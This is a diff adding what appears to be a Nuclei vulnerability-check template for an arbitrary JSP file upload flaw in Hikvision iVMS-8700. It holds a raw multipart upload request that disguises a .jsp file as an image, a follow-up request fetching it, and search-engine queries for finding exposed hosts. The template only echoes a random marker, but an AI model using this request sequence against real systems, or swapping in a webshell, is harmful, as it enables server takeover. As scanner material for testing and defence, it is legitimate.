@@ -1,0 +1,51 @@
+http:
+    - extractors:
+        - internal: true
+          json:
+            - .data.resourceUuid
+          name: res_id
+          type: json
+      matchers:
+        - dsl:
+            - body_2 == str2
+          type: dsl
+      raw:
+        - |
+          POST /eps/resourceOperations/upload.action HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: MicroMessenger
+          Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryTJyhtTNqdMNLZLhj
+
+          ------WebKitFormBoundaryTJyhtTNqdMNLZLhj
+          Content-Disposition: form-data; name="fileUploader";filename="{{str1}}.jsp"
+          Content-Type: image/jpeg
+
+          {{str3}}
+          ------WebKitFormBoundaryTJyhtTNqdMNLZLhj--
+        - |
+          GET /eps/upload/{{res_id}}.jsp HTTP/1.1
+          Host: {{Hostname}}
+id: HIKVISION-iVms-upload-upload
+info:
+    author: hufei
+    description: |
+        HIKVISION iVMS-8700综合安防管理平台存在任意文件上传漏洞，攻击者通过发送特定的请求包可以上传Webshell文件控制服务器
+    metadata:
+        fofa-query: icon_hash="-911494769"
+        hunter-query: web.body="/views/home/file/installPackage.rar"
+        max-request: 2
+        verified: true
+    name: HIKVISION-iVms-upload-upload
+    reference:
+        - https://github.com/PeiQi0/PeiQi-WIKI-Book
+    severity: critical
+    tags:
+        - "2023"
+        - HVV
+        - 海康威视
+        - ivms
+        - upload
+variables:
+    str1: '{{rand_base(6)}}'
+    str2: '{{rand_base(6)}}'
+    str3: <%out.print("{{str2}}");%>
